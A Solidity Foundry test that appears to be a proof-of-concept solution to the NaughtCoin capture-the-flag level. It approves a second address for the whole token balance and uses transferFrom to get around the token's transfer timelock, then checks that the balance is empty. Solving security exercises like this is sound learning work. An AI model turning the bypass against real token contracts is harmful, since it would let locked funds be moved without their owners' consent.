// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
import {Test, console} from "forge-std/Test.sol";
import {NaughtCoin} from "src/NaughtCoin.sol";

contract NaughtCoin_POC is Test {
    NaughtCoin _naughtCoin;
    function init() private{
        vm.startPrank(address(0x10));
        _naughtCoin = new NaughtCoin(address(this));
        vm.stopPrank();
    }
    function setUp() public {
        init();
    }

    function test_NaughtCoin_POC() public{
        _naughtCoin.approve(address(0x20),_naughtCoin.balanceOf(address(this)));
        vm.startPrank(address(0x20));
        _naughtCoin.transferFrom(address(this), address(0x20), _naughtCoin.balanceOf(address(this)));
        vm.stopPrank();

        console.log("Success:",_naughtCoin.balanceOf(address(this))==0);
    }
}